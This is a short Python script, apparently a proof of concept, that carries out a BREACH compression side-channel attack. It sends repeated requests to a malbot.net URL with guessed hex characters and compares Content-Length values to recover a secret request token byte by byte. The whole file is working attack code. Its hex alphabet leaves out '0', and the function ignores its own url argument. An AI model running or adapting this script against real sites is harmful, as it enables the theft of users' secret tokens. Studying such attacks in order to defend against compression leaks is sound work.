import requests
import time

HEXVAL = ['1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']

def BREACHattack(url):
    secret_token = ""
    masked_value = "."*32
    iter_count = 0
    # track the time taken
    time_start = time.time()

    for _ in range(32):
        actual_response_size = int(requests.get(mal_url + secret_token + masked_value).headers.get('Content-Length'))

        for h in HEXVAL:
            iter_count  +=1
            guess_token = secret_token+h+masked_value

            guess_req = int(requests.get(mal_url+guess_token).headers.get('Content-Length'))

            if (int(guess_req) <= int(actual_response_size)):
                secret_token = secret_token + h
                print("TRY Length Response = ", guess_req, "Guess:", guess_token)
                print("ACT Length Response = ", actual_response_size, "\n")
                break
            
            if(h == 'f'):
                # we checked all options but none matched, therefore end
                print("Couldn't retrieve the byte. Exiting...")
                exit()
                
        masked_value = masked_value[1:]        
        # if(len(secret_token) % 8 == 0):
        #     masked_value = masked_value[:-8]
    
    tot_time = time.time() - time_start

    return secret_token, iter_count, tot_time


mal_url = "http://malbot.net/poc/?request_token='"

secret_token, iterations, time_taken = BREACHattack(mal_url)

print("Iterations =", iterations)
print("Time elapsed =", time_taken,"seconds.")
# print("masked_value: " + masked_value)
print("Token: " + secret_token)
